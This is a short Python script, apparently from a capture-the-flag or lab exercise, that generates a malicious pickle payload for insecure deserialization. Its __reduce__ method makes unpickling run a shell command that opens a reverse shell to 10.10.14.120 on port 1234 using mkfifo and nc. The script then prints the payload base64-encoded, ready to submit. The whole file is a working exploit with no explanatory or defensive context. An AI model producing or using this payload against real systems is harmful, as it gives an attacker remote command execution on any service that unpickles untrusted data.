#!/usr/bin/env python3

import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.120 1234 > /tmp/f")
        return os.system, (cmd,)

if __name__ == "__main__":
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))